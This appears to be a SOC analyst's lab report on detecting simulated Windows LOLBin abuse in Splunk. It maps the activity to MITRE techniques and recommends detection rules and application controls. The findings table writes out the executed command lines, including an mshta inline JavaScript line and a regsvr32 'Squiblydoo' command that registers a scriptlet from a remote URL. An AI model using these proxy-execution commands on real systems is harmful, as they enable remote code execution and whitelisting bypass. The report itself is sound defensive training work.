# Investigation Report — Scenario 06: LOLBins & Execution Abuse

## Overview

| Field | Details |
|---|---|
| **Incident ID** | IR-2026-007 |
| **Scenario** | LOLBins & Execution Abuse |
| **Date of Simulation** | 21 June 2026 |
| **Analyst** | Jimil Joshi |
| **Host** | JIMIL-JOSHI |
| **Primary Account** | hp |
| **Severity** | 🟠 High |
| **MITRE ATT&CK Techniques** | T1218.005, T1218.011, T1105 |
| **Tools Used** | Splunk Enterprise (Search & Reporting), Windows Security Event Logs (Event ID 4688) |

---

## Scenario Description

This scenario simulates an attacker who already has a foothold on the system using **Living off the Land Binaries (LOLBins)** — legitimate, Microsoft-signed Windows binaries — to execute or stage malicious content. Because these binaries are trusted by the OS and most antivirus signature lists, this technique is commonly used to evade detection that relies solely on flagging known-malicious files.

**Simulated attack narrative:**
1. Attacker uses `mshta.exe` to execute inline JavaScript (HTA-style execution).
2. Attacker invokes `rundll32.exe` with a specific DLL export (`Control_RunDLL`) to simulate arbitrary code execution via a trusted binary.
3. Attacker attempts `regsvr32.exe` abuse using the "Squiblydoo" pattern — registering a remotely-hosted scriptlet (`scrobj.dll`) via a URL, a well-known defense-evasion technique for bypassing application whitelisting.

---

## Investigation Steps

1. Queried Event ID 4688 (Process Creation) for `mshta.exe` executions.
2. Queried Event ID 4688 for `rundll32.exe` executions.
3. Queried Event ID 4688 for `regsvr32.exe` executions.
4. Combined all three LOLBins into a single query to view the attack chain chronologically.
5. Reviewed `rundll32.exe` results for false positives and identified legitimate background-task noise from the machine account (`JIMIL-JOSHI$`).
6. Applied an exclusion filter to separate genuine simulated activity from normal OS behavior.

---

## Findings

| Time | Host | Account | Process | Command Line | Significance |
|---|---|---|---|---|---|
| 2026-06-21 09:31:14.903 | JIMIL-JOSHI | hp | mshta.exe | `mshta.exe javascript:alert('LOLBin Simulation Test');` | Simulated HTA/script execution via mshta (T1218.005) |
| 2026-06-21 09:31:23.939 | JIMIL-JOSHI | hp | rundll32.exe | `rundll32.exe shell32.dll,Control_RunDLL` | Simulated arbitrary DLL export execution (T1218.011) |
| 2026-06-21 09:31:43.315 | JIMIL-JOSHI | hp | regsvr32.exe | `regsvr32.exe /s /n /u /i:https://raw.githubusercontent.com scrobj.dll` | Simulated Squiblydoo-style remote scriptlet registration (T1218.010, T1105) |

**False positives identified:** Two additional `rundll32.exe` events were observed in the same time window, triggered by the `JIMIL-JOSHI$` machine account:
- `rundll32.exe C:\WINDOWS\system32\PcaSvc.dll,PcaPatchSdbTask` (Program Compatibility Assistant — legitimate Windows background task)
- `rundll32.exe C:\WINDOWS\system32\AppXDeploymentExtensions.OneCore.dll,ShellRefresh` (AppX deployment — legitimate Windows background task)

These were excluded from the final detection set, as `rundll32.exe` executes constantly as part of normal Windows operation. This is documented as a key tuning lesson: **alerting on the binary name alone produces excessive noise.** Reliable detection requires filtering on suspicious arguments, unusual parent processes, or known-malicious DLL/export combinations rather than the presence of the LOLBin itself.

---

## Attack Timeline

```
09:31:14  →  mshta.exe executes inline JavaScript (T1218.005)
09:31:23  →  rundll32.exe invoked with Control_RunDLL export (T1218.011)
09:31:43  →  regsvr32.exe attempts remote scriptlet registration — Squiblydoo (T1218.010 / T1105)
```

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Stage |
|---|---|---|
| T1218.005 | System Binary Proxy Execution: Mshta | Execution / Defense Evasion |
| T1218.011 | System Binary Proxy Execution: Rundll32 | Execution / Defense Evasion |
| T1218.010 | System Binary Proxy Execution: Regsvr32 | Execution / Defense Evasion |
| T1105 | Ingress Tool Transfer | Command and Control |

---

## Verdict & Analysis

This simulation successfully demonstrates detection of three of the most commonly abused LOLBins in real-world attacks, using only native Windows Event ID 4688 logging. The `regsvr32.exe` Squiblydoo pattern (`/i:http(s)://...`) is the highest-confidence indicator in this set, since legitimate use of `regsvr32` with a remote URL argument is exceptionally rare in normal enterprise activity.

The investigation also surfaced a realistic and important tuning lesson: `rundll32.exe` alone is a poor detection trigger due to its constant legitimate use by Windows system services. This mirrors a common SOC L1 challenge — distinguishing attacker LOLBin abuse from background OS noise requires argument-level and context-level filtering, not binary-name matching alone.

**Verdict:** 🟠 Confirmed simulated LOLBin execution abuse — all three techniques successfully detected and differentiated from legitimate system noise.

---

## Response Actions

**Immediate:**
- Investigate the source of the `mshta.exe`, `rundll32.exe`, and `regsvr32.exe` executions tied to the `hp` account.
- Block outbound network access for `regsvr32.exe` and `mshta.exe` via application control policy.
- Review for any successfully downloaded/registered remote scriptlets.

**Recommended:**
- Implement Windows Defender Application Control (WDAC) or AppLocker rules to restrict `regsvr32.exe`/`mshta.exe` usage to approved scenarios only.
- Build a correlation rule alerting specifically on `regsvr32.exe` or `mshta.exe` command lines containing `http://` or `https://`.
- Exclude known-legitimate `rundll32.exe` DLL/export combinations (e.g. `PcaSvc.dll`, `AppXDeploymentExtensions.OneCore.dll`) from alerting baselines to reduce noise.
- Enable Sysmon for richer parent-child process context on LOLBin invocations.

---

## Conclusion

Scenario 06 demonstrates detection of Living off the Land Binary abuse — a technique frequently used by real attackers to evade signature-based antivirus detection — using native Windows Event ID 4688 logging in Splunk. The investigation highlights both high-confidence detection patterns (Squiblydoo-style regsvr32 abuse) and a realistic false-positive tuning challenge (rundll32.exe background noise), reflecting the analytical judgment expected of a SOC L1 analyst.

---

**Investigated by:** Jimil Joshi
**Role:** SOC L1 Analyst (Simulated Lab Environment)
**Report Status:** Final
